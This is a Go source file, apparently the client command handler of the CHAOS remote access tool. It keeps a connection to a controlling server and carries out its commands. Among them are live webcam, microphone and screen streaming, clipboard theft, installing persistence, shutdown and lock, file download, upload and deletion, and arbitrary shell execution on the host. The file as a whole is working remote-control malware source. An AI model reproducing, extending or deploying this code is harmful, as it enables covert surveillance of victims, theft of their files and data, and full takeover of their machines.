package handler

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/gateways"
	ws "github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/utils/encode"
	"net/http"
	"strconv"
	"sync"
	"time"
)

type Handler struct {
	Connection       *websocket.Conn
	Configuration    *environment.Configuration
	Gateway          gateways.Gateway
	Services         *services.Services
	ClientID         string
	Connected        bool
	StreamingCancels map[string]context.CancelFunc
}

func NewHandler(
	configuration *environment.Configuration,
	gateway gateways.Gateway,
	services *services.Services,
	clientID string,
) *Handler {
	return &Handler{
		Configuration:    configuration,
		Gateway:          gateway,
		Services:         services,
		ClientID:         clientID,
		StreamingCancels: make(map[string]context.CancelFunc),
	}
}

func (h *Handler) KeepConnection() {
	sleepTime := 30 * time.Second

	for {
		if h.Connected {
			time.Sleep(sleepTime)
		}

		err := h.ServerIsAvailable()
		if err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}

		err = h.SendDeviceSpecs()
		if err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}

		h.Connected = true
	}
}

func (h *Handler) Log(v ...any) {
	fmt.Println(v...)
}

func (h *Handler) ServerIsAvailable() error {
	url := fmt.Sprint(h.Configuration.Server.Url, "health")
	res, err := h.Gateway.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf(string(res.ResponseBody))
	}
	return nil
}

func (h *Handler) SendDeviceSpecs() error {
	deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
	if err != nil {
		return err
	}
	body, err := json.Marshal(deviceSpecs)
	if err != nil {
		return err
	}
	url := fmt.Sprint(h.Configuration.Server.Url, "device")
	res, err := h.Gateway.NewRequest(http.MethodPost, url, body)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("error with status code %d", res.StatusCode)
	}
	return nil
}

func (h *Handler) Reconnect() {
	h.Connected = false
	for {
		conn, err := ws.NewConnection(h.Configuration, h.ClientID)
		if err != nil {
			h.Log("[!] Error connecting on WS: ", err.Error())
			time.Sleep(time.Second * 10)
			continue
		}

		h.Connection = conn
		h.Connected = true
		h.Log("[*] Successfully connected")
		break
	}
}

func (h *Handler) HandleCommand() {
	for {
		if !h.Connected {
			h.Reconnect()
			continue
		}

		_, message, err := h.Connection.ReadMessage()
		if err != nil {
			h.Log("[!] Error reading from connection:", err)
			h.Reconnect()
			continue
		}

		var request entities.Command
		if err := json.Unmarshal(message, &request); err != nil {
			continue
		}

		var response []byte
		var hasError bool

		switch request.Command {
		case "getos":
			deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
				continue
			}
			response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
			break
		case "screenshot":
			screenshot, err := h.Services.Screenshot.TakeScreenshot(100)
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
				break
			}
			response = screenshot
			break
		case "restart":
			if err := h.Services.OS.Restart(); err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "shutdown":
			if err := h.Services.OS.Shutdown(); err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "lock":
			if err := h.Services.OS.Lock(); err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "sign-out":
			if err := h.Services.OS.SignOut(); err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "persistence":
			if err := h.Services.OS.InstallPersistence(); err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "clipboard":
			clipboard, err := h.Services.OS.GetClipboard()
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			} else {
				response = encode.StringToByte(clipboard)
			}
			break
		case "webcam":
			quality := 80
			if request.Parameter != "" {
				if q, err := strconv.Atoi(request.Parameter); err == nil {
					quality = q
				}
			}
			h.Log("[+] Starting webcam streaming with quality:", quality)
			ctx, cancel := context.WithCancel(context.Background())
			h.StreamingCancels["webcam"] = cancel
			go func() {
				ticker := time.NewTicker(100 * time.Millisecond)
				defer ticker.Stop()
				streamCount := 0
				for {
					select {
					case <-ctx.Done():
						h.Log("[+] Webcam streaming stopped")
						return
					case <-ticker.C:
						image, err := h.Services.Webcam.CaptureWebcam(quality)
						if err != nil {
							h.Log("[-] Webcam capture error:", err.Error())
							continue
						}
						body, err := json.Marshal(entities.Command{
							ClientID: h.ClientID,
							Response: image,
							HasError: false,
						})
						if err != nil {
							h.Log("[-] JSON marshal error:", err.Error())
							continue
						}
						err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
						if err != nil {
							h.Log("[-] WebSocket send error:", err.Error())
							return
						}
						streamCount++
						if streamCount%10 == 0 { // Log every 10 frames
							h.Log("[+] Webcam streamed", streamCount, "frames")
						}
					}
				}
			}()
			response = []byte("Webcam streaming started")
			break
		case "microphone":
			quality := 80
			if request.Parameter != "" {
				if q, err := strconv.Atoi(request.Parameter); err == nil {
					quality = q
				}
			}
			h.Log("[+] Starting microphone streaming with quality:", quality)
			ctx, cancel := context.WithCancel(context.Background())
			h.StreamingCancels["microphone"] = cancel
			go func() {
				ticker := time.NewTicker(1 * time.Second)
				defer ticker.Stop()
				streamCount := 0
				for {
					select {
					case <-ctx.Done():
						h.Log("[+] Microphone streaming stopped")
						return
					case <-ticker.C:
						audio, err := h.Services.Microphone.CaptureAudio(1, quality)
						if err != nil {
							h.Log("[-] Microphone capture error:", err.Error())
							continue
						}
						body, err := json.Marshal(entities.Command{
							ClientID: h.ClientID,
							Response: audio,
							HasError: false,
						})
						if err != nil {
							h.Log("[-] JSON marshal error:", err.Error())
							continue
						}
						err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
						if err != nil {
							h.Log("[-] WebSocket send error:", err.Error())
							return
						}
						// Store for web access
						setStreamData(h.ClientID+"_microphone", audio)
						streamCount++
						if streamCount%5 == 0 { // Log every 5 seconds
							h.Log("[+] Microphone streamed", streamCount, "chunks")
						}
					}
				}
			}()
			response = []byte("Microphone streaming started")
			break
		case "screenstream":
			quality := 80
			if request.Parameter != "" {
				if q, err := strconv.Atoi(request.Parameter); err == nil {
					quality = q
				}
			}
			h.Log("[+] Starting screen streaming with quality:", quality)
			ctx, cancel := context.WithCancel(context.Background())
			h.StreamingCancels["screenstream"] = cancel
			go func() {
				ticker := time.NewTicker(100 * time.Millisecond)
				defer ticker.Stop()
				streamCount := 0
				for {
					select {
					case <-ctx.Done():
						h.Log("[+] Screen streaming stopped")
						return
					case <-ticker.C:
						screenshot, err := h.Services.Screenshot.TakeScreenshot(quality)
						if err != nil {
							h.Log("[-] Screenshot capture error:", err.Error())
							continue
						}
						body, err := json.Marshal(entities.Command{
							ClientID: h.ClientID,
							Response: screenshot,
							HasError: false,
						})
						if err != nil {
							h.Log("[-] JSON marshal error:", err.Error())
							continue
						}
						err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
						if err != nil {
							h.Log("[-] WebSocket send error:", err.Error())
							return
						}
						// Store for web access
						setStreamData(h.ClientID+"_screenstream", screenshot)
						streamCount++
						if streamCount%10 == 0 { // Log every 10 frames
							h.Log("[+] Screen streamed", streamCount, "frames")
						}
					}
				}
			}()
			response = []byte("Screen streaming started")
			break
		case "explore":
			fileExplorer, err := h.Services.Explorer.ExploreDirectory(request.Parameter)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasError = true
				break
			}
			explorerBytes, _ := json.Marshal(fileExplorer)
			response = explorerBytes
			break
		case "download":
			filepath := request.Parameter
			res, err := h.Services.Upload.UploadFile(filepath)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasError = true
				break
			}
			response = res
			break
		case "delete":
			filepath := request.Parameter
			err := h.Services.Delete.DeleteFile(filepath)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasError = true
				break
			}
			break
		case "upload":
			filepath := request.Parameter
			res, err := h.Services.Download.DownloadFile(filepath)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasError = true
				break
			}
			response = res
			break
		case "open-url":
			err := h.Services.Url.OpenUrl(request.Parameter)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasError = true
				break
			}
			break
		case "stop":
			streamType := request.Parameter
			if cancel, ok := h.StreamingCancels[streamType]; ok {
				cancel()
				delete(h.StreamingCancels, streamType)
				response = []byte(streamType + " streaming stopped")
			} else {
				response = []byte("No active stream for " + streamType)
			}
			break
		default:
			response, err = h.RunCommand(request.Command)
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
		}

		body, err := json.Marshal(entities.Command{
			ClientID: h.ClientID,
			Response: response,
			HasError: hasError,
		})
		if err != nil {
			continue
		}

		err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
		if err != nil {
			continue
		}
	}
}

func (h *Handler) RunCommand(command string) ([]byte, error) {
	return h.Services.Terminal.Run(command)
}

// Embedded stream functions
var streamData = make(map[string][]byte)
var streamMutex sync.Mutex

func setStreamData(key string, data []byte) {
	streamMutex.Lock()
	defer streamMutex.Unlock()
	streamData[key] = make([]byte, len(data))
	copy(streamData[key], data)
}

func getStreamData(key string) ([]byte, bool) {
	streamMutex.Lock()
	defer streamMutex.Unlock()
	data, ok := streamData[key]
	if !ok {
		return nil, false
	}
	result := make([]byte, len(data))
	copy(result, data)
	return result, true
}
